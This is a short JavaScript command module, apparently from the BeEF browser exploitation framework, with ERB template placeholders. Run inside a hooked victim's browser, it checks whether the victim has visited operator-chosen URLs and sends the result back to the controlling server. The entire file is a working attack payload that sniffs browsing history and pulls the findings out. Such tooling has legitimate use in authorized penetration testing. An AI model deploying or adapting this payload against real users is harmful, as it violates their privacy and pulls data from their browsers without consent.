beef.execute(function() {
	var results = beef.browser.hasVisited("<%== format_multiline(@urls) %>");
	window.console.log(results);
	/*var comp = "";
	if (results instanceof Array)
	{
		for (var i=0; i < results.length; i++)
		{
			comp += results[i].url+" = "+results[i].visited;
		}
	} else {
		comp = "<%= @urls %> = "+results;
	}*/
	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result="+results);
});

